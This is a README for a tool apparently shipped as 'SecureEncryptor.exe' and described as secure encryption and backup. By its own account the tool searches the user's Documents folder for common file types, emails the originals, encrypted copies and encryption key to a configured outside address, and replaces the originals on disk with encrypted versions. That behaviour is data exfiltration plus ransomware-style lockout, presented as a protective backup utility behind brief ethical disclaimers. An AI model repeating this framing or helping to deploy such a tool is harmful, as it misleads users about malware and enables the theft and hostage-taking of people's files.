#  Secure File Encryption & Backup Script

This Python script performs AES-256 encryption on specific file types in the user's `Documents` folder and sends a secure backup copy (original + encrypted + encryption key) via email. Designed for **secure backup and remote access scenarios**, this script is useful for personal data protection in automated environments.

> *Disclaimer**: This script is intended strictly for ethical and educational use. Do not deploy this script without the data owner's explicit consent.

---

## Features

- AES-256 encryption (CBC mode)
- Email delivery of:
  - Original file
  - Encrypted file
  - Encryption key info
- Recursively targets `.txt`, `.pdf`, `.docx`, `.jpg`, `.png` files in the user's `Documents` directory
- Lightweight and fast

---

## Setup

### Requirements

Install dependencies using:

```bash
pip install cryptography
```

### Configuration

Update the following constants in the script:

```python
EMAIL_ADDRESS    = "your_email@gmail.com"
EMAIL_PASSWORD   = "your_app_password"
EMAIL_TARGET     = "receiver_email@example.com"
SMTP_SERVER      = "smtp.gmail.com"
SMTP_PORT        = 587
```

Use [App Passwords](https://support.google.com/accounts/answer/185833) if you're using Gmail.

---

## Usage

This script has been updated and compiled into a standalone `.exe` executable for ease of use.

Simply run the `.exe` file:

```bash
SecureEncryptor.exe
```

The executable will:
1. Search for targeted files.
2. Encrypt them using AES-256.
3. Send the original + encrypted version + key info to the configured email.
4. Replace the original file with the encrypted one on disk.

---

## Output Example

```
✅ Processed & Encrypted: notes.txt
✅ Processed & Encrypted: report.pdf
```

---

## Encryption Details

- **Algorithm**: AES
- **Mode**: CBC
- **Key Size**: 256 bits
- **IV**: 128-bit random per file
- **Padding**: PKCS7

---

## Legal/Ethical Notice

This script should only be used on files you own or have permission to process. Unauthorized use for data extraction, spying, or exfiltration may be illegal and unethical.

---

## Contact

For educational or ethical tech inquiries:  
**Ahmed Mo'men Ahmed**  
`ahmedmoamen2200@gmail.com`
